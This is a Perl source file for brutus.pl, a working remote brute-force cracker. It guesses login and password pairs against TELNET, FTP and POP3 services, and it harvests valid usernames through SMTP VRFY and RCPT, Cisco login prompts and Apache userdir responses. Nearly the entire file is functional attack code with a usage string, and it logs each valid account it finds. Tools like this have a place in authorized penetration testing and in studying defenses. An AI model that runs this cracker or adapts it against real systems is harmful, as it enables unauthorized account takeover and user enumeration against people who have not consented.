#!/usr/bin/perl

#
# $Id: brutus.pl,v 1.7 2006/10/20 12:52:39 raptor Exp $
#
# brutus.pl v0.9.4 - remote login and password bruteforce cracker
# Copyright (c) 2000-2006 by Marco Ivaldi <raptor@0xdeadbeef.info>
#
# This program tries to break in remotely using login and password bruteforce
# attacks against TELNET (23/tcp), FTP (21/tcp) and POP3 (110/tcp) services. 
# Valid usernames list generation through SMTP VRFY/EXPN, SMTP RCPT (useful 
# with some Sendmail configurations), CISCO login and HTTP/USERDIR (with some 
# Apache Server configurations) information leaks is also supported.
#
# It shouldn't be too difficult to add the support for other protocols: feel 
# free to send me your new modules.
#
# Net::Telnet and Time::HiRes Perl modules are required (get them at CPAN).
# Core written in one night, using one hand (other arm was broken). pHEAR!
#
# TODO for 1.0:
# - new architecture, don't reconnect on each attempt!
# - signal handling (print of the last tested login when interrupted)!
# - implement non-default target port specification
# - implement verbose mode (print tests, don't log them)
# - let the user specify the sleep/usleep time
# - fix "password" bug, possibly disabling commands echo
# - implement bruteforce for password-only login services (cisco, ascend, etc.)
# - new protocols: finger, http auth/forms, ssh1/ssh2 (Net::SSH), imap, rlogin,
#   snmp, fw-1, etc. (see hydra)
# - introduce password file format user:pass
# - implement password mutation for single mode (numbers, etc.)
#
# TODO for 2.0:
# - new multithreaded architecture approach
#

# external modules
use 		Net::Telnet;
use		Time::HiRes qw(usleep);
use 		Getopt::Std;

# default variables
$name =		"brutus.pl";
$version =	"v0.9.4";
$description =	"remote login and password bruteforce cracker";
$copyright =	"Copyright (c) 2000-2006";
$author = 	"Marco Ivaldi <raptor\@0xdeadbeef.info>";

$usage = 	"\n$name $version - $description\n$copyright by $author\n\n./brutus.pl -h host -l llist [-p plist] [-s service] [-t timeout] [-S] [-L log]\n\nhost\t: target host specification (ip address | fully-qualified domain name)\nllist\t: get login list from file (or login and password list in single mode)\nplist\t: get password list from file, or activate single mode if not supplied\nservice\t: (telnet | ftp | pop3 | smtp-vrfy | smtp-rcpt | cisco | http-userdir)\ntimeout\t: explicitly set connection timeout for slow/fast nets, default is 10s\nsleep\t: enable small sleep time between each attempt, default is don't sleep\nlog\t: set the name of the optional log file where to put brutus.pl results\n\n";

$timeout = 	10;		# default timeout
$service = 	"telnet";	# default service
$sleep =	0;		# sleep disabled

$l = 		0; 		# login counter
$p = 		0; 		# password counter
$v = 		0; 		# valid counter

chomp($date = 	`date "+%m/%d, %H:%M:%S"`);

# parse command line
getopts("h:l:p:t:s:L:S");

die $usage 			# mandatory options
	if (!($opt_h) || !($opt_l));

$target = 	$opt_h;		# target host
$lfile = 	$opt_l;		# login file
$pfile = 	$opt_p;		# password file
$logfile = 	$opt_L;		# log file

$timeout = 	$opt_t 		# set timeout
	if $opt_t;
$service = 	$opt_s 		# set service
	if $opt_s;
$sleep = 	250000		# enable sleep
	if $opt_S;

die "err: $lfile: no such file\n" 
	if !(open LOGIN, "<$lfile"); 

# print start info to stdout/logfile
$start = "\n\n--- Breaking on $target $service begin at $date ---\n";
print $start;

if ($logfile) {
	die "err: $logfile: error writing to file\n" 
		if !(open LOG, ">>$logfile");
	print LOG $start;
	# flush log output
	select(LOG);
	$| = 1;
	select(STDOUT);
}

# double mode of operation (check every password for each login)
if ($pfile) {
	$i = 0;

	die "err: $pfile: no such file\n" 
		if !(open PASSWD, "<$pfile"); 

	while (<PASSWD>) {
		chomp($plist[$i] = $_);
		$i++;
	}
	close PASSWD;

	while (<LOGIN>) {
		next if $_ eq "\n"; # skip empty login

		chomp($login = $_);
		$l++;

		foreach $password (@plist) {
			$p++;

			# FTP bruteforce is supported in double mode
			if ($service eq "ftp") {
				&scan_ftp("21");
				usleep($sleep);

			# TELNET bruteforce is supported in double mode
			} elsif ($service eq "telnet") {
				&scan_telnet("23");
				usleep($sleep); # cisco telnet may need this

			# POP3 bruteforce is supported in double mode
			} elsif ($service eq "pop3") {
				&scan_pop3("110");
				usleep($sleep);

			# SMTP login discovery is NOT supported in double mode
			} elsif ($service eq "smtp-vrfy") {
				die "err: no double mode for SMTP-VRFY\n";

			# SMTP login discovery is NOT supported in double mode
			} elsif ($service eq "smtp-rcpt") {
				die "err: no double mode for SMTP-RCPT\n";

			# CISCO login discovery is NOT supported in double mode
			} elsif ($service eq "cisco") {
				die "err: no double mode for CISCO\n";

			# HTTP login discovery is NOT supported in double mode
			} elsif ($service eq "http-userdir") {
				die "err: no double mode for HTTP-USERDIR\n";

			# others
			} else {
				die "err: protocol $service not supported\n";
			}
		}

	}

# Single mode of operation (test equal login/password pairs or login-only)
} else {
	while (<LOGIN>) {
		next if $_ eq "\n"; # skip empty login

		chomp($login = $_);
		$password = $login;
		$l++; $p++;

		# FTP bruteforce is supported in single mode
		if ($service eq "ftp") {
			&scan_ftp("21");
			usleep($sleep);

		# TELNET bruteforce is supported in single mode
		} elsif ($service eq "telnet") {	
			&scan_telnet("23");
			usleep($sleep); # cisco telnet may need this

		# POP3 bruteforce is supported in single mode
		} elsif ($service eq "pop3") {
			&scan_pop3("110");
			usleep($sleep);

		# SMTP-VRFY login discovery is supported in single mode
		} elsif ($service eq "smtp-vrfy") {
			&scan_smtp_vrfy("25");	
			usleep($sleep);

		# SMTP-RCPT login discovery is supported in single mode
		} elsif ($service eq "smtp-rcpt") {
			&scan_smtp_rcpt("25");	
			usleep($sleep);

		# CISCO login discovery is supported in single mode
		} elsif ($service eq "cisco") {
			&scan_cisco("23");	
			usleep($sleep); # cisco telnet may need this

		# HTTP-USERDIR login discovery is supported in single mode
		} elsif ($service eq "http-userdir") {
			&scan_http_userdir("80");	
			usleep($sleep);

		# others
		} else {
			die "err: protocol $service not supported\n";
		}
	}

}
close LOGIN;

# print end info to stdout/logfile
chomp($date = `date "+%m/%d, %H:%M:%S"`);
$total = "\n[T]  $l login(s) and $p password(s) totally tested, $v account(s) found\n";
$total = "\n[T]  $l login(s) totally tested, $v existant login(s) found\n" 
	if ($service eq "smtp-vrfy") or ($service eq "smtp-rcpt") or ($service eq "cisco");
$end = "--- Breaking on $target $service ended at $date ---\n";
print $total;
print $end;

if ($logfile) {
	print LOG $total;
	print LOG $end;
	close LOG;
}

exit(0);

#################### local functions #######################

# logging routine
sub log {

	# valid account found!
	if ($gotcha) {
		$v++;
		$ok = "[x]  $login:$password is a VALID $service account for $target!\n";
		print $ok;
		print LOG $ok if $logfile;
	
	# account is not good
	} else {
		$ko = "[ ]  $login:$password is not good, moving on...\n";
		print $ko;
		print LOG $ko if $logfile;
	}

	return;
}

# information leak (cisco | smtp-vrfy | smtp-rcpt) logging routine
sub log_leak {

	# valid login found!
	if ($gotcha) {
		$v++;
		$ok = "$login\n";
		print $ok;
		print LOG $ok if $logfile;
	}

	return;
}

# TELNET bruteforcer (default)
sub scan_telnet {

	# connect to target host
	$t = new Net::Telnet (	
		Port => $_[0],
		Host => $target,
		Timeout => $timeout,
		Errmode => "return");
	die "err: can't connect\n" if !$t;

	# wait for login prompt and send data (generic)
	$t->waitfor(-match => '/login[: ]*$/i', -match => '/username[: ]*$/i');
	$t->print($login);
	$gotcha = 1;

	# wait for password prompt and send data (generic)
	$t->waitfor(-match => '/password[: ]*$/i');
	$t->print($password);

	# determine whether the account is valid or not (generic)
	(undef, $match) = $t->waitfor(-match => '/login[: ]*$/i',
		-match => '/username[: ]*$/i', -match => '/[\$%#>:][ ]?$/');
	$gotcha = 0 if $match =~ /(login[: ]*$)|(username[: ]*$)/i;
	$gotcha = -1 if !($match =~ /[\$%#>:][ ]?$/) and $gotcha;

	# timeout handling
	if ($gotcha == -1) {
		$t->close;
		&scan_telnet($_[0]);
		return;
	}
	
	# log and close connection
	&log;
	$t->close;
	return;
}

# FTP bruteforcer
sub scan_ftp {

	# connect to target host
	$t = new Net::Telnet (	
		Port => $_[0],
		Host => $target,
		Timeout => $timeout,
		Errmode => "return");
	die "err: can't connect\n" if !$t;

	# wait for login prompt and send data
	do { $match = $t->getline }
		until ($match =~ /^220/);
	$t->print("USER $login");
	$gotcha = 1;

	# wait for password prompt and send data
	do { $match = $t->getline }
		until ($match =~ /(^530)|(^421)|(^331)/);

	if ($match =~ /^331/) {
		$t->print("PASS $password");

		# determine whether the account is valid or not
		$match = $t->getline;
	}
	$gotcha = 0 if $match =~ /(^530)|(^421)/;
	$gotcha = -1 if !($match =~ /^230/) and $gotcha;

	# timeout handling
	if ($gotcha == -1) {
		$t->close;
		&scan_ftp($_[0]);
		return;
	}
	
	# log and close connection
	&log;
	$t->close;
	return;
}

# POP3 bruteforcer
sub scan_pop3 {

	# connect to target host
	$t = new Net::Telnet (	
		Port => $_[0],
		Host => $target,
		Timeout => $timeout,
		Errmode => "return");
	die "err: can't connect\n" if !$t;

	# wait for login prompt and send data
	do { $match = $t->getline }
		until ($match =~ /^\+OK/);
	$t->print("USER $login");
	$gotcha = 1;

	# wait for password prompt and send data
	do { $match = $t->getline }
		until ($match =~ /^\+OK/);
	$t->print("PASS $password");

	# determine whether the account is valid or not
	$match = $t->getline;
	$gotcha = 0 if $match =~ /^\-ERR/;
	$gotcha = -1 if !($match =~ /^\+OK/) and $gotcha;

	# timeout handling
	if ($gotcha == -1) {
		$t->close;
		&scan_pop3($_[0]);
		return;
	}
	
	# log and close connection
	&log;
	$t->close;
	return;
}

# SMTP-VRFY login discoverer
sub scan_smtp_vrfy {

	# connect to target host
	$t = new Net::Telnet (	
		Port => $_[0],
		Host => $target,
		Timeout => $timeout,
		Errmode => "return");
	die "err: can't connect on login $login\n" if !$t;

	# wait for prompt and send data
	do { $match = $t->getline }
		until ($match =~ /^220/);
	$t->print("VRFY $login"); # you can also use EXPN
	$gotcha = 1;

	# determine whether the login exists or not
	$match = $t->getline;
	$gotcha = 0 if $match =~ /(^550)|(^251)|(^252)/;
	$gotcha = -1 if !($match =~ /^250/) and $gotcha;

	# timeout handling
	if ($gotcha == -1) {
		$t->close;
		&scan_smtp_vrfy($_[0]);
		return;
	}
	
	# log and close connection
	&log_leak;
	$t->close;
	return;
}

# SMTP-RCPT login discoverer (beware of false positives!)
sub scan_smtp_rcpt {

	# connect to target host
	$t = new Net::Telnet (	
		Port => $_[0],
		Host => $target,
		Timeout => $timeout,
		Errmode => "return");
	die "err: can't connect on login $login\n" if !$t;

	# wait for prompt and send data
	do { $match = $t->getline }
		until ($match =~ /^220/);
	$t->print("HELO foo");
	do { $match = $t->getline }
		until ($match =~ /^250/);
	$t->print("MAIL FROM:<test\@test.com>");
	do { $match = $t->getline }
		until ($match =~ /^250/);
	$t->print("RCPT TO:<$login>");
	$gotcha = 1;

	# determine whether the login exists or not
	$match = $t->getline;
	$gotcha = 0 if $match =~ /(^550)|(^251)|(^252)/;
	$gotcha = -1 if !($match =~ /^250/) and $gotcha;

	# timeout handling
	if ($gotcha == -1) {
		$t->close;
		&scan_smtp_rcpt($_[0]);
		return;
	}
	
	# log and close connection
	&log_leak;
	$t->close;
	return;
}

# CISCO login discoverer
sub scan_cisco {

	# connect to target host
	$t = new Net::Telnet (	
		Port => $_[0],
		Host => $target,
		Timeout => $timeout,
		Errmode => "return");
	die "err: can't connect on login $login\n" if !$t;

	# wait for login prompt and send data
	$t->waitfor(-match => '/username[: ]*$/i');
	$t->print($login);
	$gotcha = 1;

	# determine whether the login exists or not
	(undef, $match) = $t->waitfor(-match => '/Username: /', 
		-match => '/Password: /');
	$gotcha = 0 if $match =~ /Username: /;
	$gotcha = -1 if !($match =~ /Password: /) and $gotcha;

	# timeout handling
	if ($gotcha == -1) {
		$t->close;
		&scan_cisco($_[0]);
		return;
	}
	
	# log and close connection
	&log_leak;
	$t->close;
	return;
}

# HTTP-USERDIR login discoverer (experimental)
sub scan_http_userdir {

	# connect to target host
	$t = new Net::Telnet (	
		Port => $_[0],
		Host => $target,
		Timeout => $timeout,
		Errmode => "return");
	die "err: can't connect on login $login\n" if !$t;

	# send data
	$t->print("HEAD /~$login HTTP/1.0\n");
	$gotcha = 1;

	# determine whether the login exists or not
	$match = $t->getline;
	$gotcha = 0 if $match =~ /404/;
	$gotcha = -1 if !($match =~ /(403)|(200)/) and $gotcha;

	# timeout handling
	if ($gotcha == -1) {
		$t->close;
		&scan_http_userdir($_[0]);
		return;
	}
	
	# log and close connection
	&log_leak;
	$t->close;
	return;
}
